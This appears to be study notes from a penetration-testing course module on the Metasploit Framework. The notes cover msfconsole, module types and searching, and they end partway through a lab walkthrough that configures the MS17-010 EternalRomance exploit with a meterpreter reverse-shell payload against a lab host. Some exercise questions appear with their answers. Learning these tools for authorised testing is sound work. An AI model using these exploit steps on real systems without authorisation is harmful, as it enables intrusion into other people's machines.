This module introduces the fundamentals of the Metasploit Framework with a retrospective analysis of the usage of automated tools in today's penetration testing environments. Despite the industry debates revolving around the level of security knowledge needed to operate a swiss army knife type tool such as Metasploit, frameworks such as this allow for in-depth exploration and auditing for which one might not have the necessary time given different circumstances. In this module, we will cover:

- A preface about using tools
- An overview of the Metasploit Framework
- Metasploit module types
- Setting targets and payloads
- Pivoting between sessions and jobs
- Importing new modules
- Creating a custom payload
- Creating a custom module
- Using Meterpreter and Kiwi

`CREST CPSA/CRT`-related Sections:

- All sections

`CREST CCT APP`-related Sections:

- All sections

`CREST CCT INF`-related Sections:

- All sections

This module is broken down into sections with accompanying hands-on exercises to practice each of the tactics and techniques we cover. The module ends with a practical hands-on skills assessment to gauge your understanding of the various topic areas.

As you work through the module, you will see example commands and command output for the various topics introduced. It is worth reproducing as many of these examples as possible to reinforce further the concepts presented in each section. You can do this in the Pwnbox provided in the interactive sections or your virtual machine.

You can start and stop the module at any time and pick up where you left off. There is no time limit or "grading," but you must complete all of the exercises and the skills assessment to receive the maximum number of cubes and have this module marked as complete in any paths you have chosen.

The module is classified as "Easy" but assumes a working knowledge of the Linux command line and an understanding of information security fundamentals.

A firm grasp of the following modules can be considered prerequisites for successful completion of this module:

- Networking Fundamentals
- Linux Fundamentals
- Web Requests
- Network Enumeration with Nmap
- Getting Started

![[Pasted image 20260527133322.png]]
# Preface

Tools have recently seen heated debates within the security industry's social media circles. Some discussions revolved around the personal preference of some groups, while others aimed towards the evaluation of tool disclosure policies to the public. Nevertheless, there is a need to point out the importance of automated tools in the industry today.

The general opinion we have indeed heard or will hear is that using automated tools during a security assessment is not the right choice. This is because they offer the security analyst or penetration tester no chance to 'prove' themselves when interacting with a vulnerable environment. Furthermore, many say that tools make the job too easy for the auditor to receive any recognition for their assessment.

Another vocal group disagrees - those consisting of newer members of the infosec community, who are just starting and making their first steps, and those who sustain the argument that tools help us learn better by offering us a more user-friendly approach to the plethora of vulnerabilities that exist in the wild while saving us time for the more intricate parts of an assessment. We will also be taking this confrontational approach to the issue.

Tools can indeed, in some cases, present us with some downsides:

- Create a comfort zone that will be hard to break out of to learn new skills
    
- Create a security risk just because they are published online for everyone to see and use
    
- Create a tunnel vision effect. `If the tool cannot do it, neither can I.`
    

Like in other industries where the creative part of the work can be combined with automated tasks, tools can limit our view and actions as new users. We can mistakenly `learn` that they provide the solutions to all problems, and we start to rely on them more and more. This, in turn, creates a tunnel vision effect that can and will limit the possible interactions that the user might think about and act upon for their assessment.

At the same time, the fact that more and more of these automated tools make their way into the public sector (see the NSA release of security tools to the public) creates more possibilities for would-be malicious actors with little to no knowledge of the industry to act upon their desires to make a quick profit or flaunt their endeavors inside dark rooms filled with smaller people.

## Discipline

If there are any discerning factors to be drawn from the current state of the information security industry, they are to be drawn on the premise that we are in a continuous, accelerated evolution of existing technologies, protocols, and systems. With the cumulus of environment variables that we encounter during an assessment, time must be saved where it can, and a strong security paradigm is formed for the auditor. Discipline is critical in all fields of work, and the conclusions are as follows:

||
|---|
|We will never have enough time to complete the assessment. With the number of technologies in use in every single environment variation, we will not be offered the time to do a complete, comprehensive assessment. Time is money, and we are on the clock for a non-tech-savvy customer, and we need to complete the bulk of the work first: the issues with the most potential impact and highest remediation turnover.|
|Credibility can be an issue even if we make our tools or manually exploit every service. We are not competing against other industry members but rather against pre-set economic conditions and personal beliefs from the customer management level. They would not comprehend or give much importance to accolades. They just want the work done in the highest possible quantity, in the least amount of time.|
|You only have to impress yourself, not the infosec community. If we achieve the first, the latter will come naturally. Using the same example as above, many artists with an online presence stray from their original goals in pursuit of online validation. Their art becomes stale and generic to the keen eye, but to the everyday user, it contains the wanted visual elements and themes, not those their followers do not yet know they want. As security researchers or penetration testers, we only must validate vulnerabilities, not validate our ego.|

## Conclusion

We have to analyze and know our tools inside and out to keep our tracks covered and avoid a cataclysmic event during our assessment. Many tools can prove to be unpredictable. Some can leave traces of activity on the target system, and some may leave our attacker platform with open gates. Nevertheless, as long as we follow the rules here, they can be a valuable educational platform for beginners and a needed time-saver mechanism for professionals.

Do not get tunnel vision. Use the tool as a tool, not as a backbone or life support for our complete assessment.

Please read all the technical documentation you can find for any of our tools. Please get to know them intimately. Leave no stone (or function or class) unturned. This will help us avoid unintended behaviors or an irate customer and a team of lawyers.

Suppose we audit our tools and set ourselves up with a solid methodology for preliminary checks and attack paths. In that case, tools will save us time for further research and a long-lasting concrete exploration of our security research paradigm. Considering the accelerated pace at which more and more technologies appear in today's environments, this further research should focus on a deeper understanding of security mechanisms, furthering our audit towards more abstract security objects on broadening the spectrum under which the analysis is made. This is how we evolve as a professional.

# Introduction to Metasploit

The `Metasploit Project` is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and modularized exploits. The `Metasploit Framework` includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the `Metasploit Project` is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development.
![[Pasted image 20260527133409.png]]
The `modules` mentioned are actual exploit proof-of-concepts that have already been developed and tested in the wild and integrated within the framework to provide pentesters with ease of access to different attack vectors for different platforms and services. Metasploit is not a jack of all trades but a swiss army knife with just enough tools to get us through the most common unpatched vulnerabilities.

Its strong suit is that it provides a plethora of available targets and versions, all a few commands away from a successful foothold. These, combined with an exploit tailor-made to those vulnerable versions and with a payload that is sent after the exploit, which will give us actual access into the system, provide us with an easy, automated way to switch between target connections during our post-exploitation ventures.

## Metasploit Pro

`Metasploit` as a product is split into two versions. The `Metasploit Pro` version is different from the `Metasploit Framework` one with some additional features:

- Task Chains
- Social Engineering
- Vulnerability Validations
- GUI
- Quick Start Wizards
- Nexpose Integration

If you're more of a command-line user and prefer the extra features, the Pro version also contains its own console, much like `msfconsole`.

To have a general idea of what Metasploit Pro's newest features can achieve, check out the list below:

|**Infiltrate**|**Collect Data**|**Remediate**|
|---|---|---|
|Manual Exploitation|Import and Scan Data|Bruteforce|
|Anti-virus Evasion|Discovery Scans|Task Chains|
|IPS/IDS Evasion|Meta-Modules|Exploitation Workflow|
|Proxy Pivot|Nexpose Scan Integration|Session Rerun|
|Post-Exploitation||Task Replay|
|Session Clean-up||Project Sonar Integration|
|Credentials Reuse||Session Management|
|Social Engineering||Credential Management|
|Payload Generator||Team Collaboration|
|Quick Pen-testing||Web Interface|
|VPN Pivoting||Backup and Restore|
|Vulnerability Validation||Data Export|
|Phishing Wizard||Evidence Collection|
|Web App Testing||Reporting|
|Persistent Sessions||Tagging Data|

## Metasploit Framework Console

The `msfconsole` is probably the most popular interface to the `Metasploit Framework` `(MSF)`. It provides an "all-in-one" centralized console and allows you efficient access to virtually all options available in the `MSF`. `Msfconsole` may seem intimidating at first, but once you learn the syntax of the commands, you will learn to appreciate the power of utilizing this interface.

The features that `msfconsole` generally brings are the following:

- It is the only supported way to access most of the features within `Metasploit`
    
- Provides a console-based interface to the `Framework`
    
- Contains the most features and is the most stable `MSF` interface
    
- Full readline support, tabbing, and command completion
    
- Execution of external commands in `msfconsole`
    

Both products mentioned above come with an extensive database of available modules to use in our assessments. These, combined with the use of external commands such as scanners, social engineering toolkits, and payload generators, can turn our setup into a ready-to-strike machine that will allow us to seamlessly control and manipulate different vulnerabilities in the wild with the use of sessions and jobs in the same way we would see tabs on an Internet browser.

The key term here is usability—user experience. The ease with which we can control the console can improve our learning experience. Therefore, let us delve into the specifics.

## Understanding the Architecture

To fully operate whatever tool we are using, we must first look under its hood. It is good practice, and it can offer us better insight into what will be going on during our security assessments when that tool comes into play. It is essential not to have [any wildcards that might leave you or your client exposed to data breaches](https://www.cobaltstrike.com/blog/cobalt-strike-rce-active-exploitation-reported).

By default, all the base files related to Metasploit Framework can be found under `/usr/share/metasploit-framework` in our `ParrotOS Security` distro.

#### Data, Documentation, Lib

These are the base files for the Framework. The Data and Lib are the functioning parts of the msfconsole interface, while the Documentation folder contains all the technical details about the project.

#### Modules

The Modules detailed above are split into separate categories in this folder. We will go into detail about these in the next sections. They are contained in the following folders:

crimsonguard@htb[/htb]`$ ls /usr/share/metasploit-framework/modules  auxiliary  encoders  evasion  exploits  nops  payloads  post`

#### Plugins

Plugins offer the pentester more flexibility when using the `msfconsole` since they can easily be manually or automatically loaded as needed to provide extra functionality and automation during our assessment.

crimsonguard@htb[/htb]`$ ls /usr/share/metasploit-framework/plugins/  aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb alias.rb           komand.rb      pcap_log.rb          sqlmap.rb auto_add_route.rb  lab.rb         request.rb           thread.rb beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb ffautoregen.rb     nexpose.rb     socket_logger.rb`

#### Scripts

Meterpreter functionality and other useful scripts.

crimsonguard@htb[/htb]`$ ls /usr/share/metasploit-framework/scripts/  meterpreter  ps  resource  shell`

#### Tools

Command-line utilities that can be called directly from the `msfconsole` menu.

crimsonguard@htb[/htb]`$ ls /usr/share/metasploit-framework/tools/  context  docs     hardware  modules   payloads dev      exploit  memdump   password  recon`

Now that we know all of these locations, it will be easy for us to reference them in the future when we decide to import new modules or even create new ones from scratch.

---
## Questions

Answer the question(s) below to complete the section

Which version of Metasploit comes equipped with a GUI interface?
- metasploit pro

What command do you use to interact with the free version of Metasploit?
- msfconsole

---

# Introduction to MSFconsole

To start interacting with the Metasploit Framework, we need to type `msfconsole` in the terminal of our choice. Many security-oriented distributions such as Parrot Security and Kali Linux come with `msfconsole` preinstalled. We can use several other options when launching the script as with any other command-line tool. These vary from graphical display switches/options to procedural ones.

## Preparation

Upon launching the `msfconsole`, we are met with their coined splash art and the command line prompt, waiting for our first command.

#### Launching MSFconsole

crimsonguard@htb[/htb]``$ msfconsole                                                                                                  `:oDFo:`                                                                        ./ymM0dayMmy/.                                                                   -+dHJ5aGFyZGVyIQ==+-                                                         `:sm⏣~~Destroy.No.Data~~s:`                                                  -+h2~~Maintain.No.Persistence~~h+-                                            `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`                                     ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.                              -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-                           -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-                         :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:                         :we're.all.alike'`                     The.PFYroy.No.D7:                         :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:                           :msf>exploit -j.                       :Ns.BOB&ALICEes7:                           :---srwxrwx:-.`                        `MS146.52.No.Per:                           :<script>.Ac816/                        sENbove3101.404:                           :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:                           :09.14.2011.raid                       /STFU|wall.No.Pr:                           :hevnsntSurb025N.                      dNVRGOING2GIVUUP:                      :#OUTHOUSE-  -s:                       /corykennedyData:                           :$nmap -oS                              SSo.6178306Ence:                           :Awsm.da:                            /shMTl#beats3o.No.:                           :Ring0:                             `dDestRoyREXKC3ta/M:                           :23d:                               sSETEC.ASTRONOMYist:                            /-                        /yo-    .ence.N:(){ :|: & };:                                                      `:Shall.We.Play.A.Game?tron/                                                      ```-ooy.if1ghtf0r+ehUser5`                                                    ..th3.H1V3.U2VjRFNN.jMh+.`                                                         `MjM~~WE.ARE.se~~MMjMs                                                              +~KANSAS.CITY's~-`                                                                   J~HAKCERS~./.`                                                                     .esc:wq!:`                                                                          +++ATH`                                                                               `          =[ metasploit v6.1.9-dev                           ] + -- --=[ 2169 exploits - 1149 auxiliary - 398 post       ] + -- --=[ 592 payloads - 45 encoders - 10 nops            ] + -- --=[ 9 evasion                                       ]  Metasploit tip: Use sessions -1 to interact with the last opened session  msf6 >`` 

Alternatively, we can use the `-q` option, which does not display the banner.

crimsonguard@htb[/htb]`$ msfconsole -q  msf6 >` 

To better look at all the available commands, we can type the `help` command. First things first, our tools need to be sharp. One of the first things we need to do is make sure the modules that compose the framework are up to date, and any new ones available to the public can be imported.

The old way would have been to run `msfupdate` in our OS terminal (outside `msfconsole`). However, the `apt` package manager can currently handle the update of modules and features effortlessly.

#### Installing MSF

crimsonguard@htb[/htb]`$ sudo apt update && sudo apt install metasploit-framework  <SNIP>  (Reading database ... 414458 files and directories currently installed.) Preparing to unpack .../metasploit-framework_6.0.2-0parrot1_amd64.deb ... Unpacking metasploit-framework (6.0.2-0parrot1) over (5.0.88-0kali1) ... Setting up metasploit-framework (6.0.2-0parrot1) ... Processing triggers for man-db (2.9.1-1) ... Scanning application launchers Removing duplicate launchers from Debian Launchers are updated`

One of the first steps we will cover in this module is searching for a proper `exploit` for our `target`. Nevertheless, we need to have a detailed perspective on the `target` itself before attempting any exploitation. This involves the `Enumeration` process, which precedes any type of exploitation attempt.

During `Enumeration`, we have to look at our target and identify which public-facing services are running on it. For example, is it an HTTP server? Is it an FTP server? Is it an SQL Database? These different `target` typologies vary substantially in the real world. We will need to start with a thorough `scan` of the target's IP address to determine what service is running and what version is installed for each service.

We will notice as we go along that versions are the key components during the `Enumeration` process that will allow us to determine if the target is vulnerable or not. Unpatched versions of previously vulnerable services or outdated code in a publicly accessible platform will often be our entry point into the `target` system.

## MSF Engagement Structure

The MSF engagement structure can be divided into five main categories.

- Enumeration
- Preparation
- Exploitation
- Privilege Escalation
- Post-Exploitation

This division makes it easier for us to find and select the appropriate MSF features in a more structured way and to work with them accordingly. Each of these categories has different subcategories that are intended for specific purposes. These include, for example, Service Validation and Vulnerability Research.

It is therefore crucial that we familiarize ourselves with this structure. Therefore, we will look at this framework's components to better understand how they are related.

![[Pasted image 20260527135031.png]]

We will go through each of these categories during the module, but we recommend looking at the individual components ourselves and digging deeper. Experimenting with the different functions is an integral part of learning a new tool or skill. Therefore, we should try out everything imaginable here in the following labs and analyze the results independently.

# Modules

As we mentioned previously, Metasploit `modules` are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild. The `exploit` category consists of so-called proof-of-concept (`POCs`) that can be used to exploit existing vulnerabilities in a largely automated manner. Many people often think that the failure of the exploit disproves the existence of the suspected vulnerability. However, this is only proof that the Metasploit exploit does not work and not that the vulnerability does not exist. This is because many exploits require customization according to the target hosts to make the exploit work. Therefore, automated tools such as the Metasploit framework should only be considered a support tool and not a substitute for our manual skills.

Once we are in the `msfconsole`, we can select from an extensive list containing all the available Metasploit modules. Each of them is structured into folders, which will look like this:

#### Syntax

```shell-session
<No.> <type>/<os>/<service>/<name>
```

#### Example

```shell-session
794   exploit/windows/ftp/scriptftp_list
```

#### Index No.

The `No.` tag will be displayed to select the exploit we want afterward during our searches. We will see how helpful the `No.` tag can be to select specific Metasploit modules later.

#### Type

The `Type` tag is the first level of segregation between the Metasploit `modules`. Looking at this field, we can tell what the piece of code for this module will accomplish. Some of these `types` are not directly usable as an `exploit` module would be, for example. However, they are set to introduce the structure alongside the interactable ones for better modularization. To explain better, here are the possible types that could appear in this field:

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.|
|`Encoders`|Ensure that payloads are intact to their destination.|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.|
|`NOPs`|(No Operation code) Keep the payload sizes consistent across exploit attempts.|
|`Payloads`|Code runs remotely and calls back to the attacker machine to establish a connection (or shell).|
|`Plugins`|Additional scripts can be integrated within an assessment with `msfconsole` and coexist.|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.|

Note that when selecting a module to use for payload delivery, the `use <no.>` command can only be used with the following modules that can be used as `initiators` (or interactable modules):

|**Type**|**Description**|
|---|---|
|`Auxiliary`|Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.|
|`Exploits`|Defined as modules that exploit a vulnerability that will allow for the payload delivery.|
|`Post`|Wide array of modules to gather information, pivot deeper, etc.|

#### OS

The `OS` tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.

#### Service

The `Service` tag refers to the vulnerable service that is running on the target machine. For some modules, such as the `auxiliary` or `post` ones, this tag can refer to a more general activity such as `gather`, referring to the gathering of credentials, for example.

#### Name

Finally, the `Name` tag explains the actual action that can be performed using this module created for a specific purpose.

## Searching for Modules

Metasploit also offers a well-developed search function for the existing modules. With the help of this function, we can quickly search through all the modules using specific `tags` to find a suitable one for our target.

#### MSF - Search Function

```shell-session
msf6 > help search

Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.

OPTIONS:
  -h                   Show this help information
  -o <file>            Send output to a file in csv format
  -S <string>          Regex pattern used to filter search results
  -u                   Use module if there is one result
  -s <search_column>   Sort the research results based on <search_column> in ascending order
  -r                   Reverse the search results order to descending order

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

For example, we can try to find the `EternalRomance` exploit for older Windows operating systems. This could look something like this:

#### MSF - Searching for EternalRomance

```shell-session
msf6 > search eternalromance

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution



msf6 > search eternalromance type:exploit

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

We can also make our search a bit more coarse and reduce it to one category of services. For example, for the CVE, we could specify the year (`cve:<year>`), the platform Windows (`platform:<os>`), the type of module we want to find (`type:<auxiliary/exploit/post>`), the reliability rank (`rank:<rank>`), and the search name (`<pattern>`). This would reduce our results to only those that match all of the above.

#### MSF - Specific Search

```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
```

## Module Selection

To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17_010) exploits. We have found that SMB server port 445 is open upon scanning the target.

crimsonguard@htb[/htb]`$ nmap -sV 10.10.10.40  Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Nmap scan report for 10.10.10.40 Host is up (0.051s latency). Not shown: 991 closed ports PORT      STATE SERVICE      VERSION 135/tcp   open  msrpc        Microsoft Windows RPC 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open  msrpc        Microsoft Windows RPC 49153/tcp open  msrpc        Microsoft Windows RPC 49154/tcp open  msrpc        Microsoft Windows RPC 49155/tcp open  msrpc        Microsoft Windows RPC 49156/tcp open  msrpc        Microsoft Windows RPC 49157/tcp open  msrpc        Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds`

We would boot up `msfconsole` and search for this exact exploit name.

#### MSF - Search for MS17_010

```shell-session
msf6 > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
```

Next, we want to select the appropriate module for this scenario. From the `Nmap` scan, we have detected the SMB service running on version `Microsoft Windows 7 - 10`. With some additional OS scanning, we can guess that this is a Windows 7 running a vulnerable instance of SMB. We then proceed to select the module with the `index no. 2` to test if the target is vulnerable.

## Using Modules

Within the interactive modules, there are several options that we can specify. These are used to adapt the Metasploit module to the given environment. Because in most cases, we always need to scan or attack different IP addresses. Therefore, we require this kind of functionality to allow us to set our targets and fine-tune them. To check which options are needed to be set before the exploit can be sent to the target host, we can use the `show options` command. Everything required to be set before the exploitation can occur will have a `Yes` under the `Required` column.

#### MSF - Select Module

```shell-session

<SNIP>

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   
   
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec): 

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Here we see how helpful the `No.` tags can be. Because now, we do not have to type the whole path but only the number assigned to the Metasploit module in our search. We can use the command `info` after selecting the module if we want to know something more about the module. This will give us a series of information that can be important for us.

#### MSF - Module Information

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   PowerShell
  2   Native upload
  3   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                          Required  Description
  ----                  ---------------                          --------  -----------
  DBGTRACE              false                                    yes       Show extra debug trace info
  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                        rdlists/named_pipes.txt
  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                           wiki/Using-Metasploit
  RPORT                 445                                      yes       The Target port (TCP)
  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                                           no        The service display name
  SERVICE_NAME                                                   no        The service name
  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                           mal read/write folder share
  SMBDomain             .                                        no        The Windows domain to use for authentication
  SMBPass                                                        no        The password for the specified username
  SMBUser                                                        no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to 
  achieve a write-what-where primitive. This will then be used to 
  overwrite the connection session information with as an 
  Administrator session. From there, the normal psexec payload code 
  execution is done. Exploits a type confusion between Transaction and 
  WriteAndX requests and a race condition in Transaction requests, as 
  seen in the EternalRomance, EternalChampion, and EternalSynergy 
  exploits. This exploit chain is more reliable than the EternalBlue 
  exploit, but requires a named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE
```

After we are satisfied that the selected module is the right one for our purpose, we need to set some specifications to customize the module to use it successfully against our target host, such as setting the target (`RHOST` or `RHOSTS`).

#### MSF - Target Specification

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

In addition, there is the option `setg`, which specifies options selected by us as permanent until the program is restarted. Therefore, if we are working on a particular target host, we can use this command to set the IP address once and not change it again until we change our focus to a different IP address.

#### MSF - Permanent Target Specification

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
